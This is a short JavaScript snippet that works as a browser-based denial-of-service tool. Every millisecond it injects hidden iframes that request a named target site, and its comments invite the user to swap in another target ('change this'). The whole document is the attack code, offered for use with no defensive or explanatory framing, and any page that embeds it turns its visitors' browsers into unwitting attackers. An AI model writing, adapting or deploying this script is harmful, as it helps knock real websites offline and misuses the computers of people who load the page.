<script>
var concurrent = 10; // too many pc will die
var target = "https://nereus.world/rank"; // change this
var i = 0;
function attack() { 
 document.getElementById("ddos").innerHTML+='<iframe src= "'+target+'" style="display: none;"></iframe>';
 i++;
 if(i == concurrent) {
  document.getElementById("ddos").innerHTML='<iframe src= "'+target+'" style="display: none;"></iframe>';
  i = 0;
 }
}
setInterval(attack, 1);
</script>
